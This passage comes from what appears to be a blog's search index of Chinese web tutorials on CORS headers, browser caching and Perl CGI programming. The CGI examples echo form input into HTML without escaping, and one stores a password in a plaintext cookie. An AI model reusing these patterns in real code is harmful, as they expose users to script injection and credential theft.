上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。 如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。 如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 1234Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。 （1）Access-Control-Allow-Origin 该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 （2）Access-Control-Allow-Credentials 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。 （3）Access-Control-Expose-Headers 该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。 3.2 withCredentials 属性 上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。 1Access-Control-Allow-Credentials: true 另一方面，开发者必须在AJAX请求中打开withCredentials属性。 12var xhr = new XMLHttpRequest();xhr.withCredentials = true; 否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。 但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。 1xhr.withCredentials = false; 需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。 四、非简单请求 4.1 预检请求 非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。 非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为&quot;预检&quot;请求（preflight）。 浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。 下面是一段浏览器的JavaScript脚本。 12345var url = &#x27;http://api.alice.com/cors&#x27;;var xhr = new XMLHttpRequest();xhr.open(&#x27;PUT&#x27;, url, true);xhr.setRequestHeader(&#x27;X-Custom-Header&#x27;, &#x27;value&#x27;);xhr.send(); 上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。 浏览器发现，这是一个非简单请求，就自动发出一个&quot;预检&quot;请求，要求服务器确认可以这样请求。下面是这个&quot;预检&quot;请求的HTTP头信息。 12345678OPTIONS /cors HTTP/1.1Origin: http://api.bob.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... &quot;预检&quot;请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。 除了Origin字段，&quot;预检&quot;请求的头信息包括两个特殊字段。 （1）Access-Control-Request-Method 该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 （2）Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 4.2 预检请求的回应 服务器收到&quot;预检&quot;请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。 123456789101112HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderContent-Type: text/html; charset=utf-8Content-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain 上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。 1Access-Control-Allow-Origin: * 如果浏览器否定了&quot;预检&quot;请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。 12XMLHttpRequest cannot load http://api.alice.com.Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. 服务器回应的其他CORS相关字段如下。 1234Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 1728000 （1）Access-Control-Allow-Methods 该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&quot;预检&quot;请求。 （2）Access-Control-Allow-Headers 如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&quot;预检&quot;中请求的字段。 （3）Access-Control-Allow-Credentials 该字段与简单请求时的含义相同。 （4）Access-Control-Max-Age 该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。 4.3 浏览器的正常请求和回应 一旦服务器通过了&quot;预检&quot;请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。 下面是&quot;预检&quot;请求之后，浏览器的正常CORS请求。 1234567PUT /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comX-Custom-Header: valueAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 上面头信息的Origin字段是浏览器自动添加的。 下面是服务器正常的回应。 12Access-Control-Allow-Origin: http://api.bob.comContent-Type: text/html; charset=utf-8 上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。 五、与JSONP的比较 CORS与JSONP的使用目的相同，但是比JSONP更强大。 JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。"},{"title":"浏览器的缓存机制","date":"2020-03-21","updated":"2024-03-19","path":"2020/03/21/浏览器的缓存机制/","text":"先看上图，如果对图中的(a)(b)©(d)四个过程的处理方式都很清楚了，那么请不用再看本文了。 两个概念 强缓存 用户发送的请求，直接从客户端缓存中获取，不发送请求到服务器，不与服务器发生交互行为。 协商缓存 用户发送的请求，发送到服务器后，由服务器判定是否从缓存中获取资源。 两者共同点：客户端获得的数据最后都是从客户端缓存中获得。 两者的区别：从名字就可以看出，强缓存不与服务器交互，而协商缓存则需要与服务器交互。 四个过程详解 （a）浏览器判定是否有缓存 先理解个概念，所谓“客户端缓存”就是指用户设备中本地资源。不同浏览器缓存文件的地址也不尽相同。 我们以chrome为例来查看下浏览器缓存文件的地址， 1）首先在chrome中输入：chrome://chrome-urls/，看到一堆列表,里面隐藏了许多浏览器的奥秘，有兴趣的可以自己深扒。 2）找到 chrome://cache（当然也可以直接输入这个地址） 为了验证缓存，我们打开百度，打开开发者模式，去掉disable-cache选项 从上图中可以看到，第一个从缓存中取的文件是： https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/css/super_min_fec0412a.css 然后回到chrome://cache 页面，找到它，并点击进去，可以看到： 回到问题，浏览器怎么判定是否有缓存，就可以转化为浏览器去读取本地放缓存的地方（注：不同浏览器不同系统都会不同）是否有该对应的请求啦。 总结来说就是个查找文件是否存在的问题。 （b）缓存是否过期 我们再以这张图为例，这张图中表明，客户端保留了一个服务器端的response header。 里面的Date字段表明此次缓存时服务器的时间。 里面有两个字段：expires 、Cache-Control expires Http1.0 中的标准，表明过期时间，注意此处的时间都是指的是服务器的时间。 可以看到过期时间被设定为了：Thu, 28 Sep 2017 06:38:37 GMT 存在的问题：服务器时间与客户端时间的不一致，就会导致缓存跟期待效果出现偏差。 Cache-Control Http1.1 中的标准，可以看成是 expires 的补充。使用的是相对时间的概念。 简单介绍下Cache-Control的属性设置。 1）max-age: 设置缓存的最大的有效时间，单位为秒（s）。max-age会覆盖掉Expires 2) s-maxage: 只用于共享缓存，比如CDN缓存（s -&gt; share）。与max-age 的区别是：max-age用于普通缓存， 而s-maxage用于代理缓存。如果存在s-maxage,则会覆盖max-age 和 Expires. 3) public：响应会被缓存，并且在多用户间共享。默认是public。 4) private: 响应只作为私有的缓存，不能在用户间共享。如果要求HTTP认证，响应会自动设置为private。 5）no-cache: 指定不缓存响应，表明资源不进行缓存。但是设置了no-cache之后并不代表浏览器不缓存，而是在缓存前要向服务器确认资源是否被更改。因此有的时候只设置no-cache防止缓存还是不够保险，还可以加上private指令，将过期时间设为过去的时间。 6）no-store: 绝对禁止缓存。 7）must-revalidate: 如果页面过期，则去服务器进行获取。 设置cache-control 的规则可以参见下图： 所以判断缓存是否过期步骤是： 1） 查看是否有cache-control 的max-age / s-maxage , 如果有，则用服务器时间date值 + max-age/s-maxage 的秒数计算出新的过期时间，将当前时间与过期时间进行比较，判断是否过期 2）查看是否有cache-control 的max-age / s-maxage，则用expires 作为过期时间比较 总结：（b）过程执行完后，如果判定为未过期，则使用客户端缓存。那么就是属于“强缓存”。 （c）跟服务器协商是否使用缓存 到这一步的时候，浏览器会向服务器发送请求，同时如果上一次的缓存中有Last-modified 和 Etag 字段， 浏览器将在request header 中加入If-Modified-Since（对应于Last-modified）， 和If-None-Match（对应于Etag）。 Last-modified: 表明请求的资源上次的修改时间。 If-Modified-Since：客户端保留的资源上次的修改时间。 Etag：资源的内容标识。（不唯一，通常为文件的md5或者一段hash值，只要保证写入和验证时的方法一致即可） If-None-Match： 客户端保留的资源内容标识。 ⚠️： 1） 分布式系统尽量关闭Etag，因为每台机器生成的Etag都不一样。 2）分布式系统里多台机器间文件的Last-Modified必须一致，以免负载均衡不同导致对比失败。 通常情况下，如果同时发送 If-None-Match 、If-Modified-Since字段，服务器只要比较etag 的内容即可，当然具体处理方式，看服务器的约定规则。 （d）协商缓存 在这个阶段，服务器一般会将Cache-control、expires 、last-modified、date、etag 等字段在response header 中返回，便于下次缓存。当然具体的场景，也是看服务器的约定规则设定。 缓存的不同来源 ⚠️： 这个问题暂时没有找到非常满意的、清楚的回答。 from disk cache 从磁盘中获取缓存资源，等待下次访问时不需要重新下载资源，而直接从磁盘中获取。它的直接操作对象为CurlCacheManager。 from memory cache 从内存中获取资源，等待下次访问时不需要重新下载资源，而直接从内存中获取。Webkit早已支持memoryCache。 目前Webkit资源分成两类，一类是主资源，比如HTML页面，或者下载项，一类是派生资源，比如HTML页面中内嵌的图片或者脚本链接，分别对应代码中两个类： MainResourceLoader和SubresourceLoader。虽然Webkit支持memoryCache，但是也只是针对派生资源，它对应的类为CachedResource，用于保存原始数据（比如CSS，JS等），以及解码过的图片数据。 区别 当退出进程时，内存中的数据会被清空，而磁盘的数据不会，所以，当下次再进入该进程时，该进程仍可以从diskCache中获得数据，而memoryCache则不行。 相似 diskCache与memoryCache相似之处就是也只能存储一些派生类资源文件。它的存储形式为一个index.dat文件，记录存储数据的url，然后再分别存储该url的response信息和content内容。Response信息最大作用就是用于判断服务器上该url的content内容是否被修改。 用户行为 最后附上一张，用户行为影响浏览器的缓存行为。 总结 自此可以将本文开头的流程图理解清楚。 遗留问题 CDN缓存？ param: no-cache? 分布式系统 ？ 负载均衡？ 缓存资源的存储与读取，浏览器是以什么规则去区分memory cache ， 还是disk cache ? 参考文献 Chrome浏览器的缓存文件位置： http://jingyan.baidu.com/article/f3e34a128e41acf5ea653554.html 浏览器缓存机制：http://www.cnblogs.com/skynet/archive/2012/11/28/2792503.html 彻底理解浏览器缓存机制 浏览器缓存知识小结及应用： http://mp.weixin.qq.com/s/HRrYWnZIWgE_Hawr81CZTw 200 ok 几种状态：http://www.cnblogs.com/tangyuu/p/6396644.html"},{"title":"Perl-CGI","date":"2020-03-20","updated":"2024-03-19","path":"2020/03/20/Perl-CGI/","text":"Perl CGI编程 什么是CGI CGI 目前由NCSA维护，NCSA定义CGI如下： CGI(Common Gateway Interface),通用网关接口,它是一段程序,运行在服务器上如：HTTP服务器，提供同客户端HTML页面的接口。 网页浏览 为了更好的了解CGI是如何工作的，我们可以从在网页上点击一个链接或URL的流程： 1、使用你的浏览器访问URL并连接到HTTP web 服务器。 2、Web服务器接收到请求信息后会解析URL，并查找访问的文件在服务器上是否存在，如果存在返回文件的内容，否则返回错误信息。 3、浏览器从服务器上接收信息，并显示接收的文件或者错误信息。 CGI程序可以是Python脚本，PERL脚本，SHELL脚本，C或者C++程序等。 CGI架构图 Web服务器支持及配置 在你进行CGI编程前，确保您的Web服务器支持CGI及已经配置了CGI的处理程序。 Apache 支持CGI 配置： 设置好CGI目录： 1ScriptAlias /cgi-bin/ /var/www/cgi-bin/ 所有的HTTP服务器执行CGI程序都保存在一个预先配置的目录。这个目录被称为CGI目录，并按照惯例，它被命名为/var/www/cgi-bin目录。 CGI文件的扩展名为.cgi，Perl 也可以使用.pl扩展名。 默认情况下，Linux服务器配置运行的cgi-bin目录中为/var/www。 如果你想指定其他运行CGI脚本的目录，可以修改httpd.conf配置文件，如下所示： 123456&lt;Directory &quot;/var/www/cgi-bin&quot;&gt; AllowOverride None Options +ExecCGI Order allow,deny Allow from all&lt;/Directory&gt; 在 AddHandler 中添加 .pl 后缀，这样我们就可以访问 .pl 结尾的 Perl 脚本文件： 1AddHandler cgi-script .cgi .pl .py 第一个 CGI 程序 以下我们创建一个 test.cgi 文件，代码如下所示： test.cgi 代码 123456789101112131415#!/usr/bin/perl print &quot;Content-type:text/html\\r\\n\\r\\n&quot;;print &#x27;&lt;html&gt;&#x27;;print &#x27;&lt;head&gt;&#x27;;print &#x27;&lt;meta charset=&quot;utf-8&quot;&gt;&#x27;;print &#x27;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&#x27;;print &#x27;&lt;/head&gt;&#x27;;print &#x27;&lt;body&gt;&#x27;;print &#x27;&lt;h2&gt;Hello Word! &lt;/h2&gt;&#x27;;print &#x27;&lt;p&gt;来自菜鸟教程第一个 CGI 程序。&lt;/p&gt;&#x27;;print &#x27;&lt;/body&gt;&#x27;;print &#x27;&lt;/html&gt;&#x27;; 1; 然后通过浏览器打开 http://localhost/cgi-bin/test.cgi，输出结果如下： 脚本第一行的输出内容&quot;Content-type:text/html\\r\\n\\r\\n&quot;发送到浏览器并告知浏览器显示的内容类型为&quot;text/html&quot;。 HTTP头部 test.cgi文件内容中的&quot; Content-type:text/html&quot;即为HTTP头部的一部分，它会发送给浏览器告诉浏览器文件的内容类型。 HTTP头部的格式如下： 1HTTP 字段名: 字段内容 例如： 1Content-type:text/html\\r\\n\\r\\n 以下表格介绍了CGI程序中HTTP头部经常使用的信息： 头 描述 Content-type: 请求的与实体对应的MIME信息。例如: Content-type:text/html Expires: Date 响应过期的日期和时间 Location: URL 用来重定向接收方到非请求URL的位置来完成请求或标识新的资源 Last-modified: Date 请求资源的最后修改时间 Content-length: N 请求的内容长度 Set-Cookie: String 设置Http Cookie CGI环境变量 所有的CGI程序都接收以下的环境变量，这些变量在CGI程序中发挥了重要的作用： 变量名 描述 CONTENT_TYPE 这个环境变量的值指示所传递来的信息的MIME类型。目前，环境变量CONTENT_TYPE一般都是：application/x-www-form-urlencoded,他表示数据来自于HTML表单。 CONTENT_LENGTH 如果服务器与CGI程序信息的传递方式是POST，这个环境变量即使从标准输入STDIN中可以读到的有效数据的字节数。这个环境变量在读取所输入的数据时必须使用。 HTTP_COOKIE 客户机内的 COOKIE 内容。 HTTP_USER_AGENT 提供包含了版本数或其他专有数据的客户浏览器信息。 PATH_INFO 这个环境变量的值表示紧接在CGI程序名之后的其他路径信息。它常常作为CGI程序的参数出现。 QUERY_STRING 如果服务器与CGI程序信息的传递方式是GET，这个环境变量的值即使所传递的信息。这个信息经跟在CGI程序名的后面，两者中间用一个问号’?'分隔。 REMOTE_ADDR 这个环境变量的值是发送请求的客户机的IP地址，例如上面的192.168.1.67。这个值总是存在的。而且它是Web客户机需要提供给Web服务器的唯一标识，可以在CGI程序中用它来区分不同的Web客户机。 REMOTE_HOST 这个环境变量的值包含发送CGI请求的客户机的主机名。如果不支持你想查询，则无需定义此环境变量。 REQUEST_METHOD 提供脚本被调用的方法。对于使用 HTTP/1.0 协议的脚本，仅 GET 和 POST 有意义。 SCRIPT_FILENAME CGI脚本的完整路径 SCRIPT_NAME CGI脚本的的名称 SERVER_NAME 这是你的 WEB 服务器的主机名、别名或IP地址。 SERVER_SOFTWARE 这个环境变量的值包含了调用CGI程序的HTTP服务器的名称和版本号。例如，上面的值为Apache/2.2.14(Unix) 以下是一个简单的CGI脚本输出CGI的环境变量： 实例 1234567891011#!/usr/bin/perl print &quot;Content-type: text/html\\n\\n&quot;;print &#x27;&lt;meta charset=&quot;utf-8&quot;&gt;&#x27;;print &quot;&lt;font size=+1&gt;环境变量：&lt;/font&gt;\\n&quot;;foreach (sort keys %ENV)&#123; print &quot;&lt;b&gt;$_&lt;/b&gt;: $ENV&#123;$_&#125;&lt;br&gt;\\n&quot;;&#125; 1; 文件下载 如果我们想通过 Perl CGI 实现文件下载，需要设置不同的头部信息，如下所示： 实例 123456789101112#!/usr/bin/perl # HTTP Headerprint &quot;Content-Type:application/octet-stream; name=\\&quot;FileName\\&quot;\\r\\n&quot;;print &quot;Content-Disposition: attachment; filename=\\&quot;FileName\\&quot;\\r\\n\\n&quot;; # Actual File Content will go hear.open( FILE, &quot;&lt;FileName&quot; );while(read(FILE, $buffer, 100) )&#123; print(&quot;$buffer&quot;);&#125; 使用GET方法传输数据 GET方法发送编码后的用户信息到服务端，数据信息包含在请求页面的URL上，以&quot;?&quot;号分割, 如下所示： 1http://www.test.com/cgi-bin/test.cgi?key1=value1&amp;key2=value2 有关 GET 请求的其他一些注释： GET 请求可被缓存 GET 请求保留在浏览器历史记录中 GET 请求可被收藏为书签 GET 请求不应在处理敏感数据时使用 GET 请求有长度限制 GET 请求只应当用于取回数据 简单的url实例：GET方法 以下是一个简单的URL，使用GET方法向test.cgi程序发送两个参数： 1/cgi-bin/test.cgi?name=菜鸟教程&amp;url=http://www.runoob.com 以下为test.cgi文件的代码： 实例 123456789101112131415161718192021222324252627282930313233#!/usr/bin/perl local ($buffer, @pairs, $pair, $name, $value, %FORM);# 读取文本信息$ENV&#123;&#x27;REQUEST_METHOD&#x27;&#125; =~ tr/a-z/A-Z/;if ($ENV&#123;&#x27;REQUEST_METHOD&#x27;&#125; eq &quot;GET&quot;)&#123; $buffer = $ENV&#123;&#x27;QUERY_STRING&#x27;&#125;;&#125;# 读取 name/value 对信息@pairs = split(/&amp;/, $buffer);foreach $pair (@pairs)&#123; ($name, $value) = split(/=/, $pair); $value =~ tr/+/ /; $value =~ s/%(..)/pack(&quot;C&quot;, hex($1))/eg; $FORM&#123;$name&#125; = $value;&#125;$name = $FORM&#123;name&#125;;$url = $FORM&#123;url&#125;; print &quot;Content-type:text/html\\r\\n\\r\\n&quot;;print &quot;&lt;html&gt;&quot;;print &quot;&lt;head&gt;&quot;;print &#x27;&lt;meta charset=&quot;utf-8&quot;&gt;&#x27;;print &#x27;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&#x27;;print &quot;&lt;/head&gt;&quot;;print &quot;&lt;body&gt;&quot;;print &quot;&lt;h2&gt;$name网址：$url&lt;/h2&gt;&quot;;print &quot;&lt;/body&gt;&quot;;print &quot;&lt;/html&gt;&quot;; 1; 查看浏览器，输出结果如下： 简单的表单实例：GET方法 以下是一个通过HTML的表单使用GET方法向服务器发送两个数据，提交的服务器脚本同样是test.cgi文件，test.html 代码如下： test.html 文件代码 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;/cgi-bin/test.cgi&quot; method=&quot;get&quot;&gt;站点名称: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;br /&gt; 站点 URL: &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 浏览器中，执行效果如下所示： 使用POST方法传递数据 使用POST方法向服务器传递数据是更安全可靠的，像一些敏感信息如用户密码等需要使用POST传输数据。 以下同样是 test.cgi ，它也可以处理浏览器提交的POST表单数据: test.cgi 代码 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/perl local ($buffer, @pairs, $pair, $name, $value, %FORM);# 读取文本信息$ENV&#123;&#x27;REQUEST_METHOD&#x27;&#125; =~ tr/a-z/A-Z/;if ($ENV&#123;&#x27;REQUEST_METHOD&#x27;&#125; eq &quot;POST&quot;)&#123; read(STDIN, $buffer, $ENV&#123;&#x27;CONTENT_LENGTH&#x27;&#125;);&#125;else &#123; $buffer = $ENV&#123;&#x27;QUERY_STRING&#x27;&#125;;&#125;# 读取 name/value 对信息@pairs = split(/&amp;/, $buffer);foreach $pair (@pairs)&#123; ($name, $value) = split(/=/, $pair); $value =~ tr/+/ /; $value =~ s/%(..)/pack(&quot;C&quot;, hex($1))/eg; $FORM&#123;$name&#125; = $value;&#125;$name = $FORM&#123;name&#125;;$url = $FORM&#123;url&#125;; print &quot;Content-type:text/html\\r\\n\\r\\n&quot;;print &quot;&lt;html&gt;&quot;;print &quot;&lt;head&gt;&quot;;print &#x27;&lt;meta charset=&quot;utf-8&quot;&gt;&#x27;;print &#x27;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&#x27;;print &quot;&lt;/head&gt;&quot;;print &quot;&lt;body&gt;&quot;;print &quot;&lt;h2&gt;$name网址：$url&lt;/h2&gt;&quot;;print &quot;&lt;/body&gt;&quot;;print &quot;&lt;/html&gt;&quot;; 1; 以下是一个通过HTML的表单使用GET方法向服务器发送两个数据，提交的服务器脚本同样是test.cgi文件，test.html 代码如下： test.html 代码 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;/cgi-bin/test.cgi&quot; method=&quot;post&quot;&gt;站点名称: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;br /&gt; 站点 URL: &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 浏览器中，执行效果如下所示： 通过CGI程序传递checkbox数据 checkbox用于提交一个或者多个选项数据，test.html 代码如下： test.html 代码 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;/cgi-bin/test.cgi&quot; method=&quot;POST&quot; target=&quot;_blank&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;runoob&quot; value=&quot;on&quot; /&gt; 菜鸟教程&lt;input type=&quot;checkbox&quot; name=&quot;google&quot; value=&quot;on&quot; /&gt; Google&lt;input type=&quot;submit&quot; value=&quot;选择站点&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 以下为 test.cgi 文件的代码： test.cgi 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/perl local ($buffer, @pairs, $pair, $name, $value, %FORM);# 读取信息$ENV&#123;&#x27;REQUEST_METHOD&#x27;&#125; =~ tr/a-z/A-Z/;if ($ENV&#123;&#x27;REQUEST_METHOD&#x27;&#125; eq &quot;POST&quot;)&#123; read(STDIN, $buffer, $ENV&#123;&#x27;CONTENT_LENGTH&#x27;&#125;);&#125;else &#123; $buffer = $ENV&#123;&#x27;QUERY_STRING&#x27;&#125;;&#125;# 读取 name/value 对信息@pairs = split(/&amp;/, $buffer);foreach $pair (@pairs)&#123; ($name, $value) = split(/=/, $pair); $value =~ tr/+/ /; $value =~ s/%(..)/pack(&quot;C&quot;, hex($1))/eg; $FORM&#123;$name&#125; = $value;&#125;if( $FORM&#123;runoob&#125; )&#123; $runoob_flag =&quot;ON&quot;;&#125;else&#123; $runoob_flag =&quot;OFF&quot;;&#125;if( $FORM&#123;google&#125; )&#123; $google_flag =&quot;ON&quot;;&#125;else&#123; $google_flag =&quot;OFF&quot;;&#125; print &quot;Content-type:text/html\\r\\n\\r\\n&quot;;print &quot;&lt;html&gt;&quot;;print &quot;&lt;head&gt;&quot;;print &#x27;&lt;meta charset=&quot;utf-8&quot;&gt;&#x27;;print &#x27;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&#x27;;print &quot;&lt;/head&gt;&quot;;print &quot;&lt;body&gt;&quot;;print &quot;&lt;h2&gt; 菜鸟教程选中状态 : $runoob_flag&lt;/h2&gt;&quot;;print &quot;&lt;h2&gt; Google 选择状态 : $google_flag&lt;/h2&gt;&quot;;print &quot;&lt;/body&gt;&quot;;print &quot;&lt;/html&gt;&quot;; 1; 浏览器中，执行效果如下所示： 通过CGI程序传递Radio数据 Radio 只向服务器传递一个数据，test.html 代码如下： test.html 代码 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;/cgi-bin/test.cgi&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;site&quot; value=&quot;runoob&quot; /&gt; 菜鸟教程&lt;input type=&quot;radio&quot; name=&quot;site&quot; value=&quot;google&quot; /&gt; Google&lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; test.cgi 脚本代码如下： test.cgi 代码 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/perl local ($buffer, @pairs, $pair, $name, $value, %FORM);# 读取信息$ENV&#123;&#x27;REQUEST_METHOD&#x27;&#125; =~ tr/a-z/A-Z/;if ($ENV&#123;&#x27;REQUEST_METHOD&#x27;&#125; eq &quot;POST&quot;)&#123; read(STDIN, $buffer, $ENV&#123;&#x27;CONTENT_LENGTH&#x27;&#125;);&#125;else &#123; $buffer = $ENV&#123;&#x27;QUERY_STRING&#x27;&#125;;&#125;# 读取 name/value 对信息@pairs = split(/&amp;/, $buffer);foreach $pair (@pairs)&#123; ($name, $value) = split(/=/, $pair); $value =~ tr/+/ /; $value =~ s/%(..)/pack(&quot;C&quot;, hex($1))/eg; $FORM&#123;$name&#125; = $value;&#125;$site = $FORM&#123;site&#125;; print &quot;Content-type:text/html\\r\\n\\r\\n&quot;;print &quot;&lt;html&gt;&quot;;print &quot;&lt;head&gt;&quot;;print &#x27;&lt;meta charset=&quot;utf-8&quot;&gt;&#x27;;print &#x27;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&#x27;;print &quot;&lt;/head&gt;&quot;;print &quot;&lt;body&gt;&quot;;print &quot;&lt;h2&gt; 选择的网站 $site&lt;/h2&gt;&quot;;print &quot;&lt;/body&gt;&quot;;print &quot;&lt;/html&gt;&quot;; 1; 浏览器中，执行效果如下所示： CGI中使用Cookie 在 http 协议一个很大的缺点就是不对用户身份的进行判断，这样给编程人员带来很大的不便， 而 cookie 功能的出现弥补了这个不足。 cookie 就是在客户访问脚本的同时，通过客户的浏览器，在客户硬盘上写入纪录数据 ，当下次客户访问脚本时取回数据信息，从而达到身份判别的功能，cookie 常用在身份校验中。 cookie的语法 http cookie的发送是通过http头部来实现的，他早于文件的传递，头部set-cookie的语法如下： 1Set-cookie:name=name;expires=date;path=path;domain=domain;secure name=name: 需要设置cookie的值(name不能使用&quot;;“和”,&quot;号),有多个name值时用 “;” 分隔，例如：name1=name1;name2=name2;name3=name3。 expires=date: cookie的有效期限,格式： expires=“Wdy,DD-Mon-YYYY HH:MM:SS” path=path: 设置cookie支持的路径,如果path是一个路径，则cookie对这个目录下的所有文件及子目录生效，例如： path=“/cgi-bin/”，如果path是一个文件，则cookie指对这个文件生效，例如：path=“/cgi-bin/cookie.cgi”。 domain=domain: 对cookie生效的域名，例如：domain=“www.runoob.com” secure: 如果给出此标志，表示cookie只能通过SSL协议的https服务器来传递。 cookie的接收是通过设置环境变量HTTP_COOKIE来实现的，CGI程序可以通过检索该变量获取cookie信息。 Cookie设置 Cookie的设置非常简单，cookie会在http头部单独发送。以下实例在cookie中设置了UserID、Password 和 expires： 实例 #!/usr/bin/perl print “Set-Cookie:UserID=XYZ;\\n”; print “Set-Cookie:Password=XYZ123;\\n”; print “Set-Cookie:Expires=Tuesday, 